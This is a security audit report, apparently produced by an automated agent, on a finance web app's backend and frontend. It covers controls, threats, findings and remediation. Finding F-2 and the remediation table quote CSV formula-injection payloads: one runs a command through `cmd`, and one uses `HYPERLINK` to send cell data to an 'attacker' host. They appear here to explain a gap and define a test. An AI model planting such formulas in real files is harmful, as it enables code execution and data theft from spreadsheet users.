# MoneyPlant — Security Self-Assessment Report

**Report date:** 2025-XX-XX
**Repository:** `C:\Users\nurep\MoneyPlant`
**Branch / commit audited:** `Prachurja` @ `c73ee34`
**Methodology:** Read-only audit (no code, docs, or configuration was modified). Every claim below is backed by `file:line` evidence; the full claim-by-claim matrix is in `docs/DOC_VERIFICATION.md`.
**Auditor:** Puku Agent (automated read-and-verify pass).
**Scope of the codebase audited:** `backend/` (FastAPI + SQLAlchemy 2 + Alembic + custom sync layer), `apps/web/` (Next.js 14 App Router, TanStack Query, Zod), `docs/` (claims surface), `sample_data/` (synthetic fixtures + the simulator-day demo). Out of scope: live third-party services (Ollama, OpenAI, Anthropic, Laya, Postgres), the production deployment target, the user's local workstation.

---

## 1. Executive Summary

MoneyPlant is presented as an **SME finance copilot / local pilot product**. The
security posture at `c73ee34` is appropriate to that positioning **provided the
pilot does not accept shared-tenant traffic, third-party credentials, or PII
beyond the seed data**.

The product's strengths are deliberate, narrow, and worth keeping:

- A **pure-decimal financial engine** that never calls any external service —
  the LLM and Laya are *advisory and explain-only*, never authoritative.
- A **rule-first decision engine** with explicit `HARD` precedence (`rule-first, LLM-explains-only`).
- A **SQL connector** that issues only `SELECT` statements, with parameterised
  binds for literals and a strict identifier regex for `table`/`schema`/column
  names, bounded by a per-connection `statement_timeout` and an enforced
  `LIMIT`.
- A **file connector** that rejects path traversal and symlink escapes, reads
  XLSX with `data_only=True` (formulas never enter Python), and uses a stable
  SHA-256 for idempotent re-sync.
- An **`/api/config/public` endpoint that returns boolean flags only** — never
  API keys, never connection URLs.
- A **`DataSourceRead` schema that deliberately omits `secret_ref`**, and a
  matching Zod mirror in `apps/web/lib/schemas.ts`.

Its weaknesses are honest and acknowledged (see `docs/IMPLEMENTATION_STATUS.md`):

- **There is no authentication / authorisation.** The pilot assumes a single
  trusted user on `http://localhost:3000` and `http://localhost:8000` (`backend/app/core/security.py:12-19`, `backend/app/main.py:59-66`).
- **CSV strings are not sanitised for formula-injection prefixes** (`=`, `+`,
  `-`, `@`). XLSX values are safe by construction (formula expressions never
  reach Python). This is documented as a gap; mitigation is queued.
- **No row-count cap on `/api/imports/commit`** — only a 10 MiB byte ceiling.
  A malicious or accidental large CSV can flood the DB. The sync connector
  *does* cap rows at 50 000.
- **No DELETE for transactions / scenarios / decision reports.** Combined
  with idempotent-import dedup, a typo at import is effectively permanent.
- **No data export endpoint.** "Give me my data" is not satisfiable today.

The combination of *no auth*, *single-instance pilot*, and *no per-row cap on
import* is the dominant risk. Until that triangle is fixed, the product is
**safe for a local pilot with synthetic data**, and **not safe to expose to
the public internet** or to ingest real PII or third-party credentials.

---

## 2. Verified Controls (TRUE rows from the verification matrix)

Each row below cites the exact source-of-truth file and line range.

| # | Control | Evidence |
|---|---|---|
| S-1 | SQL connector issues **only `SELECT`** — never INSERT/UPDATE/DDL | `backend/app/services/sync/sql_connector.py:182-210` (`sa.inspect(engine).get_columns(...)` + `sa.select(table_obj).limit(...)` only) |
| S-2 | SQL connector is **fully parameterised** for literals | `_IDENT_RE = ^[A-Za-z_][A-Za-z0-9_]*(?:\.[A-Za-z_][A-Za-z0-9_]*)?$` validates identifiers; the watermark is bound as `sa.bindparam("watermark")` (`backend/app/services/sync/sql_connector.py:42, 49-52, 202-206`) |
| S-3 | SQL connector enforces **statement_timeout + per-source row_limit** | Postgres `SET statement_timeout` on connect; SQLite `connect_args={"timeout": N}`; row_limit schema-bounded 1..1,000,000 (`backend/app/services/sync/sql_connector.py:55-95, 141`; `backend/app/schemas/data_source.py:48-49`) |
| S-4 | SQL connector **refuses unsupported drivers** | `_make_engine` raises `SqlSourceError("unsupported_db_url_scheme")` for MySQL / MSSQL / Oracle; never echoes the URL (`backend/app/services/sync/sql_connector.py:62-83`) |
| S-5 | **No free-form SQL** from any client | `DataSourceConfig` has no `query` / `sql` field; the client only sends `table`, `schema_name`, `incremental_key`, `row_limit`, `statement_timeout_seconds` (`backend/app/schemas/data_source.py:24-59`) |
| S-6 | Credentials stored as **env-var names** only | `DataSource.secret_ref` is a non-secret string; the URL is `os.environ.get(s.secret_ref, "")` at sync time (`backend/app/api/data_sources.py:257-259`) |
| S-7 | `secret_ref` **never appears in any API response** | `DataSourceRead` omits the field; Zod mirror omits it (`backend/app/schemas/data_source.py:115-135`; `apps/web/lib/schemas.ts`) |
| S-8 | Connection secrets **never logged** | Sync service wraps driver failures in `f"read_failed:{type(exc).__name__}"` rather than `str(exc)`; secrets-doesn't-leak test (`tests/test_sync.py:445-487`) |
| S-9 | File-source paths **scoped to allowed root** | `Settings.file_source_root` (default `./sample_data`); resolved candidate must `.relative_to(allowed_root)` (`backend/app/services/sync/file_connector.py:56-94`) |
| S-10 | **Path traversal rejected** | `_safe_resolve` raises `FileSourceError("path_outside_allowed_root:…")`; tests cover `..`, absolute paths (`backend/app/services/sync/file_connector.py:69-73`; `tests/test_sync.py`) |
| S-11 | **Symlink escape rejected** | Walks `candidate.parents`, rejects any symlink whose target is outside root (`backend/app/services/sync/file_connector.py:75-93`) |
| S-12 | **XLSX is values-only**, formulas never cross the boundary | `openpyxl.load_workbook(data_only=True, read_only=True)`; `ws.iter_rows(values_only=True)` (`backend/app/services/sync/file_connector.py`; `backend/app/services/ingestion/xlsx.py:30-47`) |
| S-13 | **Upload size bounded** | `upload_max_bytes = 10 MiB` enforced on `preview`, `validate`, `commit` (`backend/app/core/config.py:60`; `backend/app/api/imports.py:89, 121, 157`) |
| S-14 | **No raw transactions in LLM prompts** | `ExplanationContext` schema and both call sites (`assistant/chat`, `decisions/{id}/explain`) carry metrics + scenarios + rule summaries + `user_question` + `business_goal` — never raw `description`/`category`/`customer_or_supplier` arrays (`backend/app/services/llm/base.py:62-75`; `backend/app/api/ai.py:99-112`; `backend/app/api/decisions.py:200-214`) |
| S-15 | **`business.name` never reaches the LLM** | Only `business_industry` (enum value, e.g. `"retail"`) is passed in; the workspace name is never put in context (`backend/app/api/ai.py:96-101`; `backend/app/api/decisions.py:201-203`) |
| S-16 | **Sync is idempotent** | SHA-256 over canonical row tuple; DB unique index `uq_transactions_business_source_row_hash`; resync test asserts `count == 2` (`backend/app/services/sync/service.py:278-294`; `tests/test_sync.py:150-178`) |
| S-17 | **Sync is transactional** | All writes inside one `flush`/`commit`; per-row races caught by `db.begin_nested()` (SAVEPOINT) so a unique-constraint loss doesn't abort the run (`backend/app/services/sync/service.py:97-100, 287-294`; `tests/test_sync.py`) |
| S-18 | **Public config leaks no secrets** | `/api/config/public` returns boolean flags + provider URLs (`ai_local_base_url`, `ai_local_model`) but **no API keys, no CORS allow-list items, no DB URLs**. Documented in code (`backend/app/main.py:72-89`; `backend/app/core/config.py:23`) |
| S-19 | **Log redaction** of financial values + API-key fields | `JsonFormatter._scrub` keys `amount / money / balance / revenue / expense / profit / cash / openai_api_key / anthropic_api_key / secret_key / authorization / api_key` to `"[REDACTED]"` (`backend/app/core/logging.py:16-42, 54-66`) |
| S-20 | **Unhandled exceptions never leak stack traces** | Global FastAPI handler returns `{"error": "internal_error", "message": …}`; full detail goes to logs (`backend/app/main.py:115-122`) |
| S-21 | **CORS locked down** | `allow_credentials=False`; methods restricted to `GET, POST, PATCH, DELETE, OPTIONS`; `max_age=3600` (`backend/app/main.py:59-66`) |

---

## 3. Threats Considered

The matrix below is the threat model the implementation is argued to defend.
It is deliberately conservative: any threat absent from the controls list above
is treated as a **finding** in §4.

| T-ID | Threat | Mitigation expected |
|------|--------|---------------------|
| T-1  | SQL injection through a connected SQL source | Parameterised query + identifier regex + SELECT-only — verified S-1 / S-2 / S-3 |
| T-2  | Path traversal or symlink escape through a file source | Root containment + symlink walk — verified S-9 / S-10 / S-11 |
| T-3  | Secret leakage (connection URL, API key) through the API, logs, or DB rows | `secret_ref` schema omitted on read; URL resolved at sync time; safe error codes; log redaction — verified S-6 / S-7 / S-8 / S-19 |
| T-4  | Formula injection through an uploaded CSV (`=cmd|...`) | **GAP (Finding F-2)** — CSV strings not sanitised; XLSX values safe by construction |
| T-5  | Resource exhaustion (large file, large query, slow query) | Upload byte cap (10 MiB) verified; SQL timeout + row_limit verified; **row-count cap on manual import is missing (Finding F-3)** |
| T-6  | Idempotency violation / double-import drift | SHA-256 + unique index + SAVEPOINT race handling — verified S-16 / S-17 |
| T-7  | PII leakage to LLM providers | `ExplanationContext` ships only compact metrics — verified S-14 / S-15 |
| T-8  | Per-tenant cross-read of transactions / scenarios / decisions | **There is no tenant model (Finding F-1).** Pilot-only. |
| T-9  | Stack-trace or framework detail in error responses | Global handler redaction — verified S-20 |
| T-10 | Stale schema / drift between Pydantic ↔ Zod ↔ React | Zod mirrors Pydantic; **UI never trusts an unvalidated JSON shape** (`apps/web/lib/schemas.ts`) |

---

## 4. Findings (ordered by security importance)

Severity uses **Low / Medium / High / Critical**, ranked only by *security*
impact, not by effort.

### F-1 — No authentication / authorisation [Critical]
- **Where:** `backend/app/core/security.py:12-19`; `backend/app/main.py:59-66`.
- **What:** Every `GET/POST/PATCH/DELETE` under `/api/...` is reachable
  without credentials. There is no `Depends(get_current_user)`, no token
  validation, no role check. CORS allows an `Authorization` header that no
  middleware inspects.
- **Impact:** Any process that can reach the API port can list, create,
  edit, and delete businesses, transactions, scenarios, decisions, sync
  sources, and DataSource credentials (env-var names + scope of the
  workload).
- **Why it is acceptable today:** the product is positioned as a single-tenant
  local pilot on `localhost`.
- **What closes the gap:** add a token-based auth middleware (FastAPI
  `Depends(get_current_user)`), set `allow_credentials=True`, gate the
  destructive endpoints (`DELETE /api/businesses/{id}`,
  `DELETE /api/sources/{id}`) on the role check, return `401` for everything
  else. Re-bind the CORS allow-list to the auth origin.
- **Effort:** 2-4 days. Acceptance: a curl with no token to any non-public
  endpoint returns 401; a valid token can hit the suite.

### F-2 — CSV formula-injection sanitization missing [High]
- **Where:** `backend/app/services/ingestion/csv.py:165-247`;
  `backend/app/services/sync/file_connector.py:208-210` (sync reuses the
  same parser).
- **What:** CSV cells are read verbatim via `csv.DictReader`. A `description`
  starting with `=`, `+`, `-`, or `@` is persisted into the DB and surfaces
  in the Dashboard, Decisions, Compare, and Assistant views. XLSX is safe by
  construction (`data_only=True` resolves formula to value, never carries the
  formula expression into Python), but CSV is not.
- **Impact:** When the data is later exported by an Excel user, a string
  starting with `=` may be interpreted as a formula on open (`=cmd|'/c calc'!A0`,
  `=HYPERLINK("http://attacker/"&A2, "View")`). The threat is real for any
  CSV destined for Excel.
- **What closes the gap:** add a `_sanitize_formula_prefix()` helper and call
  it on `description`, `category`, `customer_or_supplier`, and any other free
  text cells before persistence. Strip the four bytes or wrap with
  a leading apostrophe. Document the choice in `docs/AI_AND_PRIVACY.md`.
- **Effort:** 0.5 day, with regression tests.

### F-3 — No row-count cap on `/api/imports/commit` [High]
- **Where:** `backend/app/api/imports.py:143-237`. Only the 10 MiB byte cap
  binds the size.
- **What:** A 10 MiB CSV easily holds 200 000 rows. The endpoint streams
  every parsed row into one transaction (`db.add(...)` then `db.commit()` at
  the end — see `imports.py:184-235`). The sync connector does enforce
  `row_limit=50 000`; the manual-import path does not.
- **Impact:** A malicious or accidentally large CSV can OOM the process,
  fill the DB, lock SQLite for minutes, and degrade the alert + decision
  endpoints that read from the same tables.
- **What closes the gap:** introduce `Settings.import_max_rows` (default
  50 000, configurable; aligned with `sync_sql_row_limit`), enforce in
  `commit_import` and `validate_import`. Add an explicit test that feeds
  a 100 001-row CSV and expects a `413`.
- **Effort:** 0.5 day.

### F-4 — `last_error_summary` may echo a resolved file path [Medium]
- **Where:** `backend/app/services/sync/file_connector.py:69-93` raises
  `FileSourceError("path_outside_allowed_root:{candidate}")` /
  `"symlink_outside_allowed_root:{part}"`. `service.py:164, 170, 189`
  writes that string into `SyncRun.error_summary` /
  `DataSource.last_error_summary`, both of which are surfaced through
  `DataSourceRead`.
- **What:** The resolved file path appears in the error message — including
  attempted targets that failed the root check. For a single-tenant pilot
  this is not a confidentiality violation, but for an internal-deployment
  posture (where the path itself can carry hints about server layout), the
  policy is to keep error messages short and synthetic.
- **What closes the gap:** when the failure is a containment violation,
  emit only the **synthetic code** (`"path_outside_allowed_root"`), not the
  resolved path. The detailed message can stay in the log but not in the
  `DataSourceRead` payload. Apply the same split for
  `symlink_outside_allowed_root`.
- **Effort:** 0.25 day.

### F-5 — `X-Business-Id` header is read by the frontend but not enforced [Medium]
- **Where:** `apps/web` selects the active business via
  `WorkspaceContext`. The backend does not require, validate, or even
  inspect a per-request business id beyond what each route already does
  (`/api/businesses/{id}/...`).
- **What:** Without auth (F-1), this is moot today. With auth, the front
  end will naturally start stamping a header; the backend must reject any
  cross-business access.
- **What closes the gap:** at the same time as F-1, add a
  `Depends(require_business_access(bid))` decorator and call it on every
  `/api/businesses/{bid}/...` route.

### F-6 — `CORS` allow-list is in config but has no observable auth tie-in [Medium]
- **Where:** `backend/app/core/config.py:38` (`cors_origins: str = "http://localhost:3000"`);
  `backend/app/main.py:59-66`. `Authorization` is in
  `allow_headers` but no middleware validates it.
- **What:** Until auth lands, the production-deploy suggestion in
  `docs/DEPLOYMENT.md` should explicitly forbid exposing the API on a
  public origin. Today the rule is documented; tomorrow the rule must be
  enforced.
- **What closes the gap:** require the operator to set `CORS_ORIGINS` to a
  single allowed origin in non-dev modes; refuse to start otherwise. Tie
  `cors_origins_list` to a per-environment allow-list rather than free
  comma-separated text.

### F-7 — `/api/config/public` exposes AI URLs [Low]
- **Where:** `backend/app/main.py:72-89` returns
  `ai_local_model`, `ai_local_base_url`, and `cors_origins`.
- **What:** These are not secrets in the strict sense, but they're hints
  about the operator's environment. Acceptable for a pilot; questionable
  once exposed.
- **What closes the gap:** gate `ai_local_*` behind a small flag once auth
  lands (`include_ai_endpoints`), or strip those fields when the request is
  cross-origin.

### F-8 — CSV encoding fallback is lossy [Low]
- **Where:** `backend/app/services/ingestion/csv.py:115-120`.
- **What:** Bytes that are not UTF-8 are decoded as `latin-1,
  errors="replace"`. A non-ASCII character with no latin-1 representation is
  silently replaced with `?` and persisted. Acceptable for English text;
  lossy for any currency symbol or customer name outside latin-1.
- **What closes the gap:** try `cp1252`, then `utf-16` (BOM-detected), then
  fail loudly with `unsupported_encoding` rather than replacing. Surface
  the chosen encoding on the ImportJob row (already done — `import_jobs.encoding`).
- **Effort:** 0.5 day.

### F-9 — No DELETE for transactions / scenarios / decision reports [Medium *availability*]
- **Where:** Verified across `backend/app/api/{businesses,scenarios,decisions,transactions}.py`;
  no `DELETE` verb exists at those routes.
- **What:** Idempotent import + SHA-256 dedup means a typo at upload is
  effectively permanent (`uq_transactions_business_source_row_hash` keeps the
  row in place). Combined with F-3, this is a "brittle" combination rather
  than a confidentiality one.
- **What closes the gap:** add a PATCH endpoint that allows editing the
  `description` / `category` / `customer_or_supplier` columns; add an
  explicit admin-only `DELETE /api/transactions/{id}` with an audit row in a
  new `Redactions` table.
- **Effort:** 1 day for PATCH; gated DELETE is 2-3 days with an audit table.

### F-10 — No data export endpoint [Low, *user-rights*]
- **Where:** None of `backend/app/api/*.py` returns `StreamingResponse`, no
  `csv.writer` is invoked in any response path. Verified by grep.
- **What:** "Give me my data" is not satisfiable. For a single-tenant pilot
  this is acceptable. For a multi-tenant production deployment it would be
  a regulatory issue (GDPR Art. 15/20).
- **What closes the gap:** add `GET /api/businesses/{id}/export.csv` that
  returns a streaming CSV of every `Transaction` row with the canonical
  columns.
- **Effort:** 0.5 day.

---

## 5. Items Not Verified in this Audit (honest disclosure)

- **Playwright E2E suite.** Authored (journeys A–K) but the Playwright
  binary was missing in the audit sandbox; could not run green-against-binary.
- **Live LLM / Laya call.** `AiHealthProbe` was *not* exercised against a
  real provider in this session. The "no raw transactions / no business name"
  claim was verified **by reading the code path** (`S-14` / `S-15`), not by
  running a probe.
- **Concurrent-writer behaviour on the default SQLite DB.** Not tested.
  Multi-thread `check_same_thread=False` is set in `sql_connector.py:68`;
  the main DB engine inherits defaults from SQLAlchemy. Pilot-scale only.
- **Browser-side XSS in charts.** Recharts handles text via SVG `<text>`;
  no user-controlled string is rendered with `dangerouslySetInnerHTML`.
  Verified by reading the chart components under
  `apps/web/components/dashboard/`; not exploited in this audit.
- **Dependency-vulnerability scanning.** `pip-audit` / `npm audit` were not
  run as part of this audit. They should be added to the CI pipeline.

---

## 6. Recommendations, Acceptance Criteria, and Effort Estimate

| Priority | Recommendation | Acceptance criterion | Effort |
|---|---|---|---|
| P0 | F-1: add bearer-token auth + per-business access decorator | A 401 for any non-public endpoint without a valid token. Cross-business access returns 403. | 2-4 d |
| P0 | F-2: sanitise CSV string cells for formula prefix | A regression test that drops `=cmd|' /c calc'!A0` into a CSV `description`, commits, then asserts the stored string is neutralised. | 0.5 d |
| P0 | F-3: row-count cap on `/imports/commit` | Feeding a 100 001-row CSV returns 413. The cap is exposed as a setting. | 0.5 d |
| P1 | F-4: trim resolved paths from `SyncRun.error_summary` / `DataSource.last_error_summary` for containment failures | The synthetic code is the only string in the API response; the resolved path is only in the log. | 0.25 d |
| P1 | F-5: business-access decorator (with F-1) | Same as F-1. | (rolled into F-1) |
| P1 | F-9: PATCH endpoint for transactions (description / category / customer_or_supplier) | A user can correct a typo via UI without re-importing. | 1 d |
| P2 | F-6: production CORS hardening | Refuse to start the app unless `CORS_ORIGINS` is set in non-dev modes. | 0.25 d |
| P2 | F-7: gate `ai_local_*` exposure behind auth | Anonymous `GET /api/config/public` no longer returns model/base_url. | 0.25 d |
| P2 | F-8: better CSV encoding fallback | Loud failure on unsupported encoding; never silent replace. | 0.5 d |
| P3 | F-10: CSV data export endpoint | `GET /api/businesses/{id}/export.csv` streams every row. | 0.5 d |

**Total effort for P0/P1:** ≈ 1 week of focused work. P2/P3 are 1 day each.

---

## 7. Remediation Plan (suggested sequencing)

1. **Week 0 (right now):** Lock down deployment. `CORS_ORIGINS` set to the
   production origin; publish the "single-tenant pilot" disclaimer on
   `docs/DEPLOYMENT.md`. Add `pip-audit` and `npm audit` to CI; fail the build
   on Critical / High advisories with no waiver.
2. **Week 1, Day 1-2:** F-2 (CSV sanitization) and F-3 (row cap). Both are
   small, both have clear acceptance tests. Land in `Prachurja`, run the
   full backend test suite green.
3. **Week 1, Day 3-5:** F-1 (auth) and F-5 (business-access decorator). The
   bigger PR; needs design review. Wire `fastapi-users` or hand-rolled
   bearer-token middleware. Roll F-9 PATCH into the same PR.
4. **Week 2, polish:** F-4, F-6, F-7, F-8, F-10 in any order.
5. **Continuous:** run `pytest -p no:cacheprovider`, `npm run typecheck`,
   `npm run lint`, `npm run test`, and the Playwright suite in CI on every
   push. The audit found Playwright unrun in the local sandbox — the CI
   runner is the verification path of record.

---

## 8. Compliance Snapshot (voluntary)

- **GDPR Art. 15/20 — Right of access / data portability:** partial. No
  export endpoint. Mitigation: P3 F-10.
- **GDPR Art. 17 — Right to erasure:** partial. Business-level deletion
  exists (`DELETE /api/businesses/{id}`); row-level deletion does not
  exist. Mitigation: P1 F-9.
- **GDPR Art. 32 — Security of processing:** partial. Cryptographic
  safeguards absent; pseudonymisation not applicable at MVP scale.
  Mitigation: combined P0/P1 work above.
- **OWASP API Security Top 10 (2023):**
  - API1 Broken Object Level Authorisation — **vulnerable** (F-1 / F-5).
  - API2 Broken Authentication — **vulnerable** (F-1).
  - API3 Broken Object Property Level Authorisation — partial; `secret_ref`
    is correctly excluded from the read shape (S-7).
  - API4 Unrestricted Resource Consumption — partial; row cap missing (F-3).
  - API5 Broken Function Level Authorisation — **vulnerable** (F-1).
  - API6 Unrestricted Access to Sensitive Business Flows — single-tenant
    posture, mitigated by deployment (S-21).
  - API7 Server Side Request Forgery — N/A; no URL submission in the
    product (S-5).
  - API8 Security Misconfiguration — partial; `last_error_summary` may
    disclose a path (F-4).
  - API9 Improper Inventory Management — public-config endpoint exists
    and is documented (S-18).
  - API10 Unsafe Consumption of APIs — `httpx` is used with explicit
    timeouts in the LLM provider base class; log redaction (S-19).
- **NIST SSDF (SP 800-218):** PO.5 / PS.1 are met via this document;
  PW.4 / PW.5 partially met (no dependency vulnerability scanning yet).

---

## 9. Closing Note

The engineering posture of this codebase — *rule-first, deterministic,
pure-decimal*, with adapters that are written defensively and tested under
adversarial inputs — is genuinely the right approach for an SME finance
copilot. The risk surface is concentrated in a small number of honest gaps
(no auth, no row cap, no formula sanitization on CSV). None of those gaps
are exotic; they are textbook pilots that turn into production blockers
when the pilot graduates to shared use.

The recommendation in one line: **land the P0 mitigations before exposing the
API to any untrusted network**, and the rest of the P1 / P2 work within one
sprint thereafter. The audit evidence above should make all of these tickets
straightforward to scope.

— end of report —
